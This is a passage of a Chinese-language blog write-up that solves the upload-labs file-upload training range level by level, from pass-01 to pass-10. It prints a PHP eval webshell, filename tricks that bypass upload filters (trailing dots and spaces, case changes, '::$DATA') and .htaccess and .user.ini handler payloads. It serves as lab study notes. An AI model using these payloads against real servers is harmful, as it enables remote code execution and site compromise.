<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"x4297.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="upload-labs是一个总结了文件上传漏洞的靶场，可以在github上下载源码https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;upload-labs 本次练习将网站搭建在本地虚拟机上，使用 phpstudy  有一些文件上传漏洞需要一些特定的配置，比如 .user.ini，我不是很懂这些配置，有一些场景无法成功复现，所以就直接整理网上的答案了 本文纯文字，无配图，配合搭建好的upload-l">
<meta property="og:type" content="article">
<meta property="og:title" content="upload-labs记录">
<meta property="og:url" content="https://x4297.github.io/2022/02/14/upload-labs%E8%AE%B0%E5%BD%95/index.html">
<meta property="og:site_name" content="x4297&#39;s blog">
<meta property="og:description" content="upload-labs是一个总结了文件上传漏洞的靶场，可以在github上下载源码https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;upload-labs 本次练习将网站搭建在本地虚拟机上，使用 phpstudy  有一些文件上传漏洞需要一些特定的配置，比如 .user.ini，我不是很懂这些配置，有一些场景无法成功复现，所以就直接整理网上的答案了 本文纯文字，无配图，配合搭建好的upload-l">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-02-14T08:49:44.000Z">
<meta property="article:modified_time" content="2022-04-23T12:08:06.209Z">
<meta property="article:author" content="x4297">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://x4297.github.io/2022/02/14/upload-labs%E8%AE%B0%E5%BD%95/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>upload-labs记录 | x4297's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">x4297's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">记录美好生活</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">5</span></a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://x4297.github.io/2022/02/14/upload-labs%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/Yuumi.jpg">
      <meta itemprop="name" content="x4297">
      <meta itemprop="description" content="开摆!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="x4297's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          upload-labs记录
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-02-14 16:49:44" itemprop="dateCreated datePublished" datetime="2022-02-14T16:49:44+08:00">2022-02-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-04-23 20:08:06" itemprop="dateModified" datetime="2022-04-23T20:08:06+08:00">2022-04-23</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>upload-labs是一个总结了文件上传漏洞的靶场，可以在github上下载源码<a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p>
<p>本次练习将网站搭建在本地虚拟机上，使用 phpstudy</p>
<hr>
<p>有一些文件上传漏洞需要一些特定的配置，比如 .user.ini，我不是很懂这些配置，有一些场景无法成功复现，所以就直接整理网上的答案了</p>
<p><strong>本文纯文字，无配图，配合搭建好的upload-labs环境或者源码食用更佳（可以当作一个备忘录，碰到涉及的情景但是忘记怎么做可以看看）</strong></p>
<h1 id="pass-01（前端js验证）"><a href="#pass-01（前端js验证）" class="headerlink" title="pass-01（前端js验证）"></a>pass-01（前端js验证）</h1><p> 前端白名单验证扩展名</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义允许上传的文件类型</span></span><br><span class="line"><span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>我们的目标是将小马或一句话木马传到网站上，再用蚁剑（github上可以下载）连接</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;kfc&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>蚁剑使用post方法比较方便，get可能有点问题</p>
<h2 id="一、burp-suite-抓包，再修改文件扩展名"><a href="#一、burp-suite-抓包，再修改文件扩展名" class="headerlink" title="一、burp suite 抓包，再修改文件扩展名"></a>一、burp suite 抓包，再修改文件扩展名</h2><p>将一句话木马的文件扩展名改为白名单之一，如 ma.jpg，打开burpsuite的拦截功能，然后在网页中选择文件并上传 ma.jpg，抓到包之后</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; <span class="attribute">name</span>=<span class="string">&quot;upload_file&quot;</span>; <span class="attribute">filename</span>=<span class="string">&quot;ma.jpg&quot;</span></span><br></pre></td></tr></table></figure>

<p>filename 扩展名改为 php</p>
<p>成功上传 ma.php</p>
<p>上传后会在 img 标签中显示上传的路径</p>
<h2 id="二、浏览器控制台覆盖检查函数（f12中修改js代码）"><a href="#二、浏览器控制台覆盖检查函数（f12中修改js代码）" class="headerlink" title="二、浏览器控制台覆盖检查函数（f12中修改js代码）"></a>二、浏览器控制台覆盖检查函数（f12中修改js代码）</h2><p>相关检查函数如下</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//定义允许上传的文件类型</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//提取上传文件的类型</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span></span><br><span class="line"><span class="javascript">        <span class="comment">//判断上传文件类型是否允许上传</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == -<span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span></span><br><span class="line"><span class="javascript">            alert(errMsg);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在 script 标签中的代码直接在 element 中修改没有用，网上查到了一个办法，在 console 中覆盖这个函数</p>
<p>查看js代码可以知道，函数名是 checkFile ，如果文件扩展名不在白名单中会返回 false，那我们直接将这个函数改为直接返回true即可</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title">checkFile</span>() &#123; <span class="keyword">return</span> <span class="type">true</span>; &#125;</span><br></pre></td></tr></table></figure>

<p>然后就可以正常上传 ma.php 了</p>
<h1 id="pass-02（MIME）"><a href="#pass-02（MIME）" class="headerlink" title="pass-02（MIME）"></a>pass-02（MIME）</h1><p>pass-01的方法一可以使用</p>
<p>检查的应该是这一行</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-<span class="built_in">Type</span>: <span class="built_in">image</span>/jpeg</span><br></pre></td></tr></table></figure>



<h1 id="pass-03（黑名单，不常见扩展名绕过）"><a href="#pass-03（黑名单，不常见扩展名绕过）" class="headerlink" title="pass-03（黑名单，不常见扩展名绕过）"></a>pass-03（黑名单，不常见扩展名绕过）</h1><p>上传文件后显示</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提示：不允许上传<span class="string">.asp</span>,<span class="string">.aspx</span>,<span class="string">.php</span>,<span class="string">.jsp</span>后缀文件！</span><br></pre></td></tr></table></figure>

<p>不过既然是黑名单，就可以先试试想办法绕过黑名单</p>
<p>之后为了验证漏洞更加方便，就不上传一句话木马了，直接上传如下代码，运行 phpinfo 函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>网上看来的</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php由于历史原因，部分解释器可能支持符合正则 <span class="regexp">/ph(p[2-7]?|t(ml)?)/</span> 的后缀，如 php <span class="regexp">/ php5 /</span> pht <span class="regexp">/ phtml /</span> shtml <span class="regexp">/ pwml /</span> phtm 等 可在禁止上传php文件时测试该类型。</span><br></pre></td></tr></table></figure>

<p>试了一下</p>
<p>php5 访问时 403，phtml 访问时直接把代码下载下来了。不把这个文件的内容当成php代码解析，应该和中间件的配置有关</p>
<p>或者配合文件包含漏洞使用</p>
<hr>
<p>黑名单部分代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br></pre></td></tr></table></figure>

<p>先删除了末尾的空格，再删除了末尾的点，再删除一次空格，做到后面回过头来想到了，我们可以构造一个比较特殊的文件名（burpsuite 抓包修改）</p>
<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.php. .</span><br></pre></td></tr></table></figure>

<p>这样可以上传成功，但是因为上传后的文件重命名了，扩展名使用代码运行时判断合法的扩展名，所以无法成功利用。使用上述文件名时 $file_ext = “.”，只有一个点，上传后windows自动把点去掉，就等于没有扩展名</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;  <span class="comment">// img_path 中最后拼接上了 file_ext          </span></span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">        <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="pass-04（-htaccess）"><a href="#pass-04（-htaccess）" class="headerlink" title="pass-04（.htaccess）"></a>pass-04（.htaccess）</h1><p>此关没有将上传的文件重命名，提示如下</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本pass禁止上传.php|<span class="type">.php5</span>|<span class="type">.php4</span>|<span class="type">.php3</span>|<span class="type">.php2</span>|<span class="type">php1</span>|<span class="type">.html</span>|<span class="type">.htm</span>|<span class="type">.phtml</span>|<span class="type">.pHp</span>|<span class="type">.pHp5</span>|<span class="type">.pHp4</span>|<span class="type">.pHp3</span>|<span class="type">.pHp2</span>|<span class="type">pHp1</span>|<span class="type">.Html</span>|<span class="type">.Htm</span>|<span class="type">.pHtml</span>|<span class="type">.jsp</span>|<span class="type">.jspa</span>|<span class="type">.jspx</span>|<span class="type">.jsw</span>|<span class="type">.jsv</span>|<span class="type">.jspf</span>|<span class="type">.jtml</span>|<span class="type">.jSp</span>|<span class="type">.jSpx</span>|<span class="type">.jSpa</span>|<span class="type">.jSw</span>|<span class="type">.jSv</span>|<span class="type">.jSpf</span>|<span class="type">.jHtml</span>|<span class="type">.asp</span>|<span class="type">.aspx</span>|<span class="type">.asa</span>|<span class="type">.asax</span>|<span class="type">.ascx</span>|<span class="type">.ashx</span>|<span class="type">.asmx</span>|<span class="type">.cer</span>|<span class="type">.aSp</span>|<span class="type">.aSpx</span>|<span class="type">.aSa</span>|<span class="type">.aSax</span>|<span class="type">.aScx</span>|<span class="type">.aShx</span>|<span class="type">.aSmx</span>|<span class="type">.cEr</span>|<span class="type">.sWf</span>|<span class="type">.swf</span>后缀文件！</span><br></pre></td></tr></table></figure>

<p>上传 .htaccess 文件，作用是覆盖 apache 的配置</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType <span class="built_in">application</span>/x-httpd-php .abcd</span><br></pre></td></tr></table></figure>

<p>匹配扩展名，或者匹配文件名</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;phpinfo.jpg&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br><span class="line"></span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>

<p>在本地环境测试无法成功（答案来源于网络）</p>
<p>网上有说要把 AllowOverride 改为 all 的，还要把 LoadModule rewrite_module modules/mod_rewrite.so 前面的注释符去掉，我都试过了，本地环境为 windows + phpstudy</p>
<hr>
<p>这关没有使用随机数拼上后缀名，而是直接使用上传的文件名</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">    	<span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    	<span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再试一下</p>
<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo.php. .</span><br></pre></td></tr></table></figure>

<p>这次倒是成了，上传后文件名为 <code>phpinfo.php</code></p>
<h1 id="pass-05（-user-ini）"><a href="#pass-05（-user-ini）" class="headerlink" title="pass-05（.user.ini）"></a>pass-05（.user.ini）</h1><p>github上面写的</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入一个新的<span class="keyword">Pass</span>-<span class="number">05</span>，其余<span class="keyword">Pass</span>编号依次往后递增</span><br></pre></td></tr></table></figure>

<p>网上说也是上传配置文件，不过这次是php的，相当于覆盖全局的配置，或者说分布式配置</p>
<p>文件名 <code>.user.ini</code> 内容如下</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=phpinfo.jpg</span><br></pre></td></tr></table></figure>

<p>意思是 php文件自动 include phpinfo.jpg</p>
<p>然后打开 upload 文件夹下本就有的 readme.php</p>
<p>意料之中地在本地环境失败了</p>
<hr>
<p>这也是个不会改名的</p>
<p>可以使用 <code>phpinfo.php. .</code> 绕过</p>
<h1 id="pass-06（大小写）"><a href="#pass-06（大小写）" class="headerlink" title="pass-06（大小写）"></a>pass-06（大小写）</h1><p>相比之前几关少了 strtolower 函数转换成小写，所以可以改变扩展名中的部分字母大小写来绕过</p>
<p>上传成功</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP 500 - Internal<span class="built_in"> Server </span><span class="builtin-name">Error</span> 服务器内部错误</span><br></pre></td></tr></table></figure>

<p>但是不知道哪配置错了，换 nginx 可以正常访问</p>
<hr>
<p>会使用合法后缀名来重命名</p>
<h1 id="pass-07（末尾空格）"><a href="#pass-07（末尾空格）" class="headerlink" title="pass-07（末尾空格）"></a>pass-07（末尾空格）</h1><p>相比之前少了 trim 函数，没有删去文件名两头的空格</p>
<p>windows中，重命名时，扩展名最后加空格，系统会自动去掉</p>
<p>所以可以用burpsuite 上传文件时在将文件名最后加上空格</p>
<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Dispositi<span class="symbol">on:</span> form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;phpinfo.php&quot;</span></span><br><span class="line"></span><br><span class="line">=&gt; Content-Dispositi<span class="symbol">on:</span> form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;phpinfo.php &quot;</span></span><br></pre></td></tr></table></figure>



<h1 id="pass-08（末尾点）"><a href="#pass-08（末尾点）" class="headerlink" title="pass-08（末尾点）"></a>pass-08（末尾点）</h1><p>相比之前少了 deldot 函数，这不是php内置的函数，是作者自己写的，用于去除文件名末尾多余的 . 的</p>
<p>. 和空格一样，windows会把文件名最后的点和空格自动去掉</p>
<p>所以可以用burpsuite 上传文件时在将文件名最后加上点</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; <span class="attribute">name</span>=<span class="string">&quot;upload_file&quot;</span>; <span class="attribute">filename</span>=<span class="string">&quot;phpinfo.php.&quot;</span></span><br></pre></td></tr></table></figure>



<h1 id="pass-09（-DATA）"><a href="#pass-09（-DATA）" class="headerlink" title="pass-09（::$DATA）"></a>pass-09（::$DATA）</h1><p>与前面相比，少了如下代码</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="regexp">//</span>去除字符串::<span class="variable">$DATA</span></span><br></pre></td></tr></table></figure>

<p>文件名后面加上 ::$DATA ，windows系统上传后会自动去掉，可以通过原来的文件名访问（网上好像说和 NTFS 有关，不是很懂）</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; <span class="attribute">name</span>=<span class="string">&quot;upload_file&quot;</span>; <span class="attribute">filename</span>=<span class="string">&quot;phpinfo.php::<span class="variable">$data</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>访问 upload/202202162245205952.php（重命名为随机名字） 即可</p>
<h1 id="pass-10（末尾空格和点交替）"><a href="#pass-10（末尾空格和点交替）" class="headerlink" title="pass-10（末尾空格和点交替）"></a>pass-10（末尾空格和点交替）</h1><p>前面 <code>phpinfo.php. .</code> 的灵感来源</p>
<p>先看看过滤空格和点以及转换大小写的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span 